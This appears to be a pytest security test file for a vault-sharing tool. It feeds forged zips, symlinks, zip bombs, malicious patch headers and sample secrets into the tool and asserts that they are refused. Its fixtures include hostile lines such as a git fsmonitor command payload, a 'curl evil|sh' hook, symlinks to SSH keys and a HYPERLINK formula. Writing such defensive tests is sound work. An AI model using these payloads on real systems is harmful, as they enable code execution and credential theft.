"""A received copy is hostile input. Every test here feeds a real malicious fixture to the real entry point and checks
what lands on disk, not only the message. The forger recomputes the stamp's tree_hash each time (it is a plain sha256 in
the same archive), so a passing hash proves nothing and these tests show the rules, not the hash, are what stop it."""
import io
import json
import stat
import zipfile

import pytest
from conftest import run
from sharing import git, make_vault, with_remote
from test_proposals import GROUPS, TODAY, review_it, whys, world, wt_of  # noqa: F401  (world is a fixture)

from vela import cli, opening, proposal, publish, review, secretscan, untrusted
from vela.edge import replays

FSMONITOR = b"[core]\n\tfsmonitor = touch /tmp/vela-pwned #\n"


@pytest.fixture
def published(tmp_path):
    vault = make_vault(tmp_path)
    archive = tmp_path / "copy.zip"
    code, text = run("publish", "--vault", str(vault), "--out", str(archive), "--today", "2026-10-11")
    assert code == 0, text
    return vault, archive


def forged(archive, out, extra=(), symlinks=(), drop=()):
    """The published zip plus hostile entries, with a stamp whose tree_hash the forger recomputed."""
    with zipfile.ZipFile(archive) as src:
        top = src.namelist()[0].split("/")[0]
        files = {n[len(top) + 1:]: src.read(n) for n in src.namelist() if not n.endswith("/")}
    for name in drop:
        files.pop(name)
    files.update(dict(extra))
    stamp = json.loads(files[publish.STAMP_PATH])
    stamp["tree_hash"] = publish.tree_hash({k: v for k, v in files.items() if k != publish.STAMP_PATH})
    files[publish.STAMP_PATH] = publish.stamp_bytes(stamp)
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as dst:
        for name, data in files.items():
            dst.writestr(f"{top}/{name}", data)
        for name, target in symlinks:
            info = zipfile.ZipInfo(f"{top}/{name}")
            info.create_system = 3
            info.external_attr = (stat.S_IFLNK | 0o777) << 16
            dst.writestr(info, target)
    return out


def open_into(source, into):
    return run("open", str(source), "--into", str(into), "--author", "Sam Okoye", "--today", "2026-10-12")


# ------------------------------------------------------------------ C1, C15: open

@pytest.mark.parametrize("name", [".git/config", ".GIT/config", ".git./config", "notes/.git/hooks/post-checkout"])
def test_open_refuses_a_zip_carrying_git_internals_and_writes_nothing(tmp_path, published, name):
    _, archive = published
    evil = forged(archive, tmp_path / "evil.zip", extra={name: FSMONITOR})
    code, text = open_into(evil, tmp_path / "ws")
    assert code == 2 and name in text and "git" in text
    assert not (tmp_path / "ws").exists()


def test_open_refuses_a_zip_that_plants_velas_own_state(tmp_path, published):
    """A planted .vela/workspace.json would make a copy report itself as an owner's vault."""
    _, archive = published
    evil = forged(archive, tmp_path / "evil.zip", extra={".vela/workspace.json": b'{"role": "owner"}', ".claude/skills/vela/scripts/vela": b"#!/bin/sh\n"})
    code, text = open_into(evil, tmp_path / "ws")
    assert code == 2 and ".vela/workspace.json" in text or ".claude/skills/vela" in text
    assert not (tmp_path / "ws").exists()


def test_open_refuses_a_symlink_entry_naming_it(tmp_path, published):
    _, archive = published
    evil = forged(archive, tmp_path / "evil.zip", symlinks=[("notes.md", "/Users/victim/.ssh/id_rsa")])
    code, text = open_into(evil, tmp_path / "ws")
    assert code == 2 and "notes.md" in text and "symbolic link" in text
    assert not (tmp_path / "ws").exists()


def test_open_refuses_a_folder_with_a_symlink(tmp_path, published):
    vault, _ = published
    folder = tmp_path / "folder"
    assert run("publish", "--vault", str(vault), "--out", str(folder), "--today", "2026-10-11")[0] == 0
    (folder / "stolen.md").symlink_to(tmp_path / "secret.txt")
    code, text = open_into(folder, tmp_path / "ws")
    assert code == 2 and "stolen.md" in text and "symbolic link" in text


def test_open_refuses_a_folder_carrying_git_internals(tmp_path, published):
    vault, _ = published
    folder = tmp_path / "folder"
    assert run("publish", "--vault", str(vault), "--out", str(folder), "--today", "2026-10-11")[0] == 0
    (folder / ".git").mkdir()
    (folder / ".git" / "config").write_bytes(FSMONITOR)
    code, text = open_into(folder, tmp_path / "ws")
    assert code == 2 and ".git/config" in text and not (tmp_path / "ws").exists()


def test_open_leaves_out_programs_and_settings_and_says_so(tmp_path, published):
    """C2/C15: hooks, workflows, Claude settings, bin/, .husky and an MCP config are not pages. They are left out and named."""
    _, archive = published
    hostile = {".githooks/pre-commit": b"#!/bin/sh\ncurl evil|sh\n", ".husky/pre-commit": b"#!/bin/sh\n", ".claude/settings.json": b'{"hooks": {}}',
               ".github/workflows/ci.yml": b"on: push\n", "bin/tool": b"#!/bin/sh\n", ".mcp.json": b"{}", ".obsidian/plugins/x/main.js": b"//",
               ".vscode/tasks.json": b"{}", ".gitattributes": b"* filter=x\n", "run.sh": b"#!/bin/sh\n"}
    evil = forged(archive, tmp_path / "evil.zip", extra=hostile)
    code, text = open_into(evil, tmp_path / "ws")
    assert code == 0, text
    assert "Left out of your copy" in text
    for name in hostile:
        assert not (tmp_path / "ws" / name).exists(), name
        assert not (tmp_path / "ws" / ".vela" / "baseline" / name).exists(), name
    assert (tmp_path / "ws" / ".vela.yaml").is_file()


def test_a_forged_hash_verifies_which_is_why_the_hash_is_not_the_defense(tmp_path, published):
    """C14: the forger recomputed tree_hash, so verify_tree is happy. The refusal above came from the rules, not the hash."""
    _, archive = published
    evil = forged(archive, tmp_path / "evil.zip", extra={"01-goals.md": b"changed by someone else\n"})
    code, text = open_into(evil, tmp_path / "ws")
    assert code == 0, text  # a page changed with a matching hash opens; nothing here claims to know who sent it
    assert "accidents" in opening.verify_tree.__doc__


def test_the_hash_mismatch_message_says_it_cannot_tell_who_sent_the_copy(tmp_path, published):
    _, archive = published
    with zipfile.ZipFile(archive) as src, zipfile.ZipFile(tmp_path / "e.zip", "w") as dst:
        for info in src.infolist():
            data = src.read(info)
            dst.writestr(info, b"edited\n" if info.filename.endswith("01-goals.md") else data)
    code, text = open_into(tmp_path / "e.zip", tmp_path / "ws")
    assert code == 2 and "who sent" in text


# ------------------------------------------------------------------ size and count limits (zip bomb)

def test_open_refuses_a_zip_bomb_by_its_declared_size(tmp_path, published):
    _, archive = published
    bomb = tmp_path / "bomb.zip"
    with zipfile.ZipFile(archive) as src, zipfile.ZipFile(bomb, "w", zipfile.ZIP_DEFLATED) as dst:
        for info in src.infolist():
            dst.writestr(info.filename, src.read(info))
        dst.writestr(src.namelist()[0].split("/")[0] + "/huge.md", b"\0" * (untrusted.MAX_FILE_BYTES + 1))
    assert bomb.stat().st_size < 1024 * 1024  # a megabyte at most on disk
    code, text = open_into(bomb, tmp_path / "ws")
    assert code == 2 and "huge.md" in text and "MB" in text
    assert not (tmp_path / "ws").exists()


def test_open_refuses_too_many_entries(tmp_path, published, monkeypatch):
    _, archive = published
    monkeypatch.setattr(untrusted, "MAX_ENTRIES", 5)
    code, text = open_into(archive, tmp_path / "ws")
    assert code == 2 and "entries" in text and not (tmp_path / "ws").exists()


def test_open_refuses_a_total_over_the_limit(tmp_path, published, monkeypatch):
    _, archive = published
    monkeypatch.setattr(untrusted, "MAX_TOTAL_BYTES", 2000)
    code, text = open_into(archive, tmp_path / "ws")
    assert code == 2 and "unpacks to more than" in text


def test_open_refuses_the_same_name_twice(tmp_path, published):
    _, archive = published
    twice = tmp_path / "twice.zip"
    with zipfile.ZipFile(archive) as src, zipfile.ZipFile(twice, "w") as dst:
        for info in src.infolist():
            dst.writestr(info, src.read(info))
        dst.writestr(src.namelist()[1].upper(), b"x")
    code, text = open_into(twice, tmp_path / "ws")
    assert code == 2 and "twice" in text


# ------------------------------------------------------------------ C4: junk

def test_a_committed_ds_store_does_not_make_a_published_copy_unopenable(tmp_path):
    vault = make_vault(tmp_path)
    (vault / ".DS_Store").write_bytes(b"\0\0junk")
    (vault / "Thumbs.db").write_bytes(b"junk")
    git(vault, "add", "-f", "-A")
    git(vault, "commit", "-q", "-m", "junk")
    archive = tmp_path / "copy.zip"
    assert run("publish", "--vault", str(vault), "--out", str(archive), "--today", "2026-10-11")[0] == 0
    with zipfile.ZipFile(archive) as z:
        assert not [n for n in z.namelist() if n.endswith(("DS_Store", "Thumbs.db"))]
    code, text = open_into(archive, tmp_path / "ws")
    assert code == 0, text


def test_an_older_copy_that_hashed_its_junk_still_opens(tmp_path, published):
    _, archive = published
    with zipfile.ZipFile(archive) as src:
        top = src.namelist()[0].split("/")[0]
        files = {n[len(top) + 1:]: src.read(n) for n in src.namelist() if not n.endswith("/")}
    files["x/.DS_Store"] = b"junk"
    stamp = json.loads(files[publish.STAMP_PATH])
    stamp["tree_hash"] = publish.tree_hash({k: v for k, v in files.items() if k != publish.STAMP_PATH})  # the old publisher counted it
    files[publish.STAMP_PATH] = publish.stamp_bytes(stamp)
    old = tmp_path / "old.zip"
    with zipfile.ZipFile(old, "w") as dst:
        for name, data in files.items():
            dst.writestr(f"{top}/{name}", data)
    assert open_into(old, tmp_path / "ws")[0] == 0


# ------------------------------------------------------------------ C2, C3: proposals

def test_a_proposal_build_refuses_programs_and_settings_naming_the_file(world):
    _, workspace = world
    for name in (".githooks/pre-commit", ".claude/settings.json", "bin/claude-vela", ".github/workflows/ci.yml", ".vela.yaml"):
        target = workspace / name
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text("x\n", encoding="utf-8")
        code, text = run("propose", "--vault", str(workspace), "--title", "t", "--today", TODAY, "--groups")
        assert code == 2 and name in text, (name, text)
        target.unlink()


def test_the_path_check_is_case_blind_for_git_internals():
    for name in (".GIT/hooks/post-checkout", ".git/config", ".gitattributes", ".gitmodules"):
        with pytest.raises(proposal.ProposalError):
            proposal.check_path(name)


PATCH_HEADERS = {
    "rename": "rename from reader-notes.md\nrename to .githooks/pre-commit\n",
    "copy": "copy from reader-notes.md\ncopy to .githooks/pre-commit\n",
    "symlink": "new file mode 120000\n",
    "executable": "new file mode 100755\n",
    "mode change": "old mode 100644\nnew mode 100755\n",
    "similarity": "similarity index 100%\n",
}


@pytest.mark.parametrize("kind", sorted(PATCH_HEADERS))
def test_review_refuses_an_extended_patch_header_before_git_sees_it(world, tmp_path, kind):
    src, workspace = world
    code, text = run("propose", "--vault", str(workspace), "--title", "Clearer cap rule", "--today", TODAY, "--whys", str(whys(tmp_path, **{g: "r" for g in GROUPS})))
    assert code == 0, text
    folder = tmp_path / "proposals" / "2026-10-18-clearer-cap-rule"
    patch = folder / "changes.patch"
    lines = patch.read_text(encoding="utf-8").split("\n")
    at = next(i for i, line in enumerate(lines) if line.startswith("diff --git a/reader-notes.md"))
    lines.insert(at + 1, PATCH_HEADERS[kind].rstrip("\n"))
    patch.write_text("\n".join(lines), encoding="utf-8")
    code, text = review_it(src, folder)
    assert code == 2 and "not one this tool writes" in text
    assert not wt_of(src).exists() and git(src, "branch", "--list", "proposal/*") == ""
    assert not (src / ".githooks").exists()


def test_a_rename_into_githooks_cannot_get_through_parse_patch():
    base = "a" * 40
    patch = (f"# vela proposal\n# base: {base}\n# initiative: INI-001\ndiff --git a/a.md b/a.md\n"
             "rename from a.md\nrename to .githooks/pre-commit\n")
    with pytest.raises(review.ReviewError, match="rename"):
        review.parse_patch(patch.encode())


def test_what_git_really_applied_is_checked_after_the_fact():
    """The net under the parser: git, not our parse, says what a patch did."""
    untrusted.check_applied([("M", "100644", "05/page.md"), ("A", "100644", "x.md"), ("D", "000000", "gone.md")], "")
    for entry in (("A", "120000", "link.md"), ("A", "100755", "x.md"), ("A", "100644", ".githooks/pre-commit"), ("A", "160000", "sub")):
        with pytest.raises(untrusted.Refused):
            untrusted.check_applied([entry], "")
    with pytest.raises(untrusted.Refused, match="outside the vault folder"):
        untrusted.check_applied([("A", "100644", "elsewhere/x.md")], "vault/")


def test_a_patch_over_the_size_limit_is_refused(monkeypatch):
    monkeypatch.setattr(untrusted, "MAX_PATCH_BYTES", 100)
    with pytest.raises(review.ReviewError, match="MB"):
        review.parse_patch(b"x" * 101)


def test_a_proposal_zip_with_a_symlink_or_a_bomb_is_refused(tmp_path):
    from vela.edge import proposals as files
    link = tmp_path / "link.zip"
    with zipfile.ZipFile(link, "w") as z:
        info = zipfile.ZipInfo("p/changes.patch")
        info.create_system = 3
        info.external_attr = (stat.S_IFLNK | 0o777) << 16
        z.writestr(info, "/etc/passwd")
    with pytest.raises(files.ProposalIOError, match="symbolic link"):
        files.read(link)
    bomb = tmp_path / "bomb.zip"
    with zipfile.ZipFile(bomb, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("p/changes.patch", b"\0" * (untrusted.MAX_FILE_BYTES + 1))
    with pytest.raises(files.ProposalIOError, match="MB"):
        files.read(bomb)


def test_a_proposal_folder_whose_patch_is_a_symlink_is_refused(tmp_path):
    from vela.edge import proposals as files
    folder = tmp_path / "p"
    folder.mkdir()
    (tmp_path / "secret").write_text("secret", encoding="utf-8")
    (folder / "changes.patch").symlink_to(tmp_path / "secret")
    with pytest.raises(files.ProposalIOError, match="symbolic link"):
        files.read(folder)


# ------------------------------------------------------------------ view and explore of a received vault

def test_a_received_vault_page_that_is_a_symlink_is_not_read(tmp_path):
    vault = tmp_path / "vault"
    import shutil
    from conftest import MINI
    shutil.copytree(MINI, vault)
    (tmp_path / "private.md").write_text("---\nid: x\n---\nsecret\n", encoding="utf-8")
    (vault / "taken.md").symlink_to(tmp_path / "private.md")
    code, text = run("view", "--vault", str(vault), "--out", str(tmp_path / "v.html"))
    assert code == 2 and "taken.md" in text and "symbolic link" in text
    assert not (tmp_path / "v.html").exists()


# ------------------------------------------------------------------ the rule table

@pytest.mark.parametrize("path, kind", [
    ("01-goals.md", untrusted.OK), ("sessions/2026-10-09-x.md", untrusted.OK), (".vela.yaml", untrusted.OK), (".gitignore", untrusted.OK),
    (".vela/explorer-pins.json", untrusted.OK), (".vela/published.json", untrusted.OK), ("dashboard.html", untrusted.OK),
    (".git/config", untrusted.FORBIDDEN), (".Git/config", untrusted.FORBIDDEN), ("a/.git/HEAD", untrusted.FORBIDDEN), ("GIT~1/config", untrusted.FORBIDDEN),
    (".vela/workspace.json", untrusted.FORBIDDEN), (".claude/skills/vela/scripts/vela", untrusted.FORBIDDEN), ("voice/local/me.md", untrusted.FORBIDDEN),
    ("../x", untrusted.FORBIDDEN), ("/etc/x", untrusted.FORBIDDEN), ("a\\b", untrusted.FORBIDDEN), ("a//b", untrusted.FORBIDDEN), ("a\x00b", untrusted.FORBIDDEN),
    (".claude/settings.json", untrusted.PROGRAM), (".githooks/pre-commit", untrusted.PROGRAM), (".github/workflows/ci.yml", untrusted.PROGRAM),
    (".husky/pre-commit", untrusted.PROGRAM), (".mcp.json", untrusted.PROGRAM), ("bin/claude-vela", untrusted.PROGRAM), ("x/run.ps1", untrusted.PROGRAM),
    (".obsidian/plugins/a/main.js", untrusted.PROGRAM), (".gitattributes", untrusted.PROGRAM), (".gitmodules", untrusted.PROGRAM),
])
def test_the_one_list_of_forbidden_paths(path, kind):
    assert untrusted.verdict(path)[0] == kind


# ------------------------------------------------------------------ C16: secrets

def commit_page(vault, text):
    (vault / "01-goals.md").write_text((vault / "01-goals.md").read_text(encoding="utf-8") + "\n" + text + "\n", encoding="utf-8")
    git(vault, "add", "-A")
    git(vault, "commit", "-q", "-m", "note")


SECRETS = {"github": "token ghp_" + "a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8",
           "aws": "key AKIA" + "ABCDEFGHIJKLMNOP",
           "pem": "-----BEGIN RSA PRIVATE KEY-----",
           "url": "postgres://app:hunter22pw@db.internal/prod",
           "slack": "xoxb-" + "1234567890-abcdefghij",
           "assignment": "api_key = 'k3y9Zq81LmN0pQ7rS'"}


@pytest.mark.parametrize("kind", sorted(SECRETS))
def test_publish_refuses_a_page_with_a_secret_and_never_prints_it(tmp_path, kind):
    vault = make_vault(tmp_path)
    commit_page(vault, SECRETS[kind])
    code, text = run("publish", "--vault", str(vault), "--out", str(tmp_path / "out.zip"), "--today", "2026-10-11")
    assert code == 2 and "01-goals.md" in text and "--allow-secrets" in text
    assert SECRETS[kind].split()[-1] not in text and "hunter22pw" not in text
    assert not (tmp_path / "out.zip").exists()


def test_allow_secrets_publishes_and_records_that_it_did(tmp_path):
    vault = make_vault(tmp_path)
    commit_page(vault, SECRETS["github"])
    code, text = run("publish", "--vault", str(vault), "--out", str(tmp_path / "out.zip"), "--today", "2026-10-11", "--allow-secrets")
    assert code == 0 and "--allow-secrets" in text and (tmp_path / "out.zip").is_file()


def test_ordinary_prose_about_tokens_and_passwords_is_not_flagged():
    prose = {"a.md": "The token: required for login. Password rules: see CON-002.\nSet api_key = <your key> and token=${TOKEN}.\nsk-learn is a library; xox is not a token.\n"}
    assert secretscan.find_secrets(prose) == []


# ------------------------------------------------------------------ C8, C13, C21, C26, C30, C10

@pytest.mark.parametrize("text", ["/root/notes", "c:\\users\\bob\\x", "C:/Users/bob/x", "/mnt/c/users/bob", "\\\\corp\\home\\bob",
                                  "/var/folders/ab/T/x", "/Users/bob/x", "see /home/bob"])
def test_the_home_path_scan_finds_every_shape(text):
    assert proposal.HOME_PATH.search(text)


@pytest.mark.parametrize("text", ["GET /users/42", "the /root-cause analysis", "see C:\\Program Files"])
def test_the_home_path_scan_leaves_prose_alone(text):
    assert not proposal.HOME_PATH.search(text)


def test_view_does_not_publish_a_token_from_the_remote_url(tmp_path):
    vault = make_vault(tmp_path)
    git(vault, "remote", "add", "origin", "https://bob:ghp_SECRET123@github.com/acme/plan.git")
    out = tmp_path / "v.html"
    assert run("view", "--vault", str(vault), "--out", str(out))[0] == 0
    html = out.read_text(encoding="utf-8")
    assert "ghp_SECRET123" not in html and "github.com/acme/plan.git" in html
    out2 = tmp_path / "v2.html"
    assert run("view", "--vault", str(vault), "--out", str(out2), "--repo-url", "https://u:tok3n@example.com/r.git")[0] == 0
    assert "tok3n" not in out2.read_text(encoding="utf-8")


def test_redact_remote_keeps_the_ssh_account_name():
    from vela import export
    assert export.redact_remote("git@github.com:acme/plan.git") == "git@github.com:acme/plan.git"
    assert export.redact_remote("ssh://git:pw@host/x.git") == "ssh://host/x.git"


def test_two_copies_published_on_one_day_are_not_ordered_by_guessing():
    existing = {"initiative": "I", "base_commit": "b" * 40, "base_date": "2026-10-12", "base_tree_hash": "h1"}
    stamp = {"initiative": "I", "commit": "a" * 40, "short": "aaaaaaa", "date": "2026-10-12", "tree_hash": "h2"}
    verdict = opening.reopen_verdict(existing, stamp)
    assert verdict == opening.SAME_DAY and "--newer" in opening.reopen_refusal(existing, stamp, verdict)
    assert opening.reopen_verdict(existing, stamp, confirmed_newer=True) == opening.NEWER
    assert opening.reopen_verdict(existing, {**stamp, "date": "2026-10-13"}) == opening.NEWER


@pytest.mark.parametrize("path", ["Dropbox", "Dropbox (Personal)", "Google Drive", "GoogleDrive-me@x.com", "iCloud Drive", "Mobile Documents",
                                  "com~apple~CloudDocs", "OneDrive - Acme", "Box"])
def test_every_common_sync_folder_is_refused(path):
    with pytest.raises(opening.OpenError, match="synced folder"):
        opening.refuse_synced(("/", "Users", "me", path, "plan"), "/x")


def test_a_folder_that_only_mentions_onedrive_is_not_a_sync_folder():
    opening.refuse_synced(("/", "Users", "me", "Code", "onedrive-migration"), "/x")


def test_the_jira_csv_does_not_carry_a_live_formula():
    from vela import tickets
    row = {c: "" for c in tickets.COLUMNS} | {"Summary": "=HYPERLINK(\"http://evil\",\"x\")", "labels": [], "Blocked by": ""}
    import csv
    cells = list(csv.reader(io.StringIO(tickets.csv_text([row]))))[1]
    assert cells[1].startswith("'=HYPERLINK")


def test_a_failed_baseline_swap_puts_the_old_baseline_back(tmp_path, monkeypatch):
    """C10: the retry used to delete baseline.previous, the only copy of the old baseline."""
    baseline, staging, previous = tmp_path / "baseline", tmp_path / "baseline.next", tmp_path / "baseline.previous"
    baseline.mkdir()
    (baseline / "old.md").write_text("old", encoding="utf-8")
    staging.mkdir()
    real = replays.os.replace
    calls = []

    def flaky(src, dst):
        calls.append((src, dst))
        if len(calls) == 2:
            raise PermissionError(13, "held by a sync client", str(dst))
        return real(src, dst)
    monkeypatch.setattr(replays.os, "replace", flaky)
    with pytest.raises(PermissionError):
        replays.swap_baseline(baseline, staging, previous)
    assert (baseline / "old.md").read_text(encoding="utf-8") == "old" and not previous.exists()


def test_a_baseline_left_parked_is_restored_before_any_cleanup(tmp_path):
    baseline, previous = tmp_path / "baseline", tmp_path / "baseline.previous"
    previous.mkdir()
    (previous / "old.md").write_text("old", encoding="utf-8")
    replays.restore_parked_baseline(baseline, previous)
    assert (baseline / "old.md").is_file() and not previous.exists()


def test_a_page_cannot_make_the_explorer_read_a_private_file(tmp_path):
    """E23: design: and breakdown: read only Markdown under docs/tech-design or docs/plan."""
    import pathlib
    from vela.explorer.design_find import not_a_doc
    assert not_a_doc(pathlib.Path("/home/me/team/docs/tech-design/x.md"), "tech-design") == ""
    assert "not a Markdown file" in not_a_doc(pathlib.Path("/home/me/.ssh/id_rsa"), "tech-design")
    assert "not under a docs/tech-design" in not_a_doc(pathlib.Path("/home/me/Documents/salary-notes.md"), "tech-design")
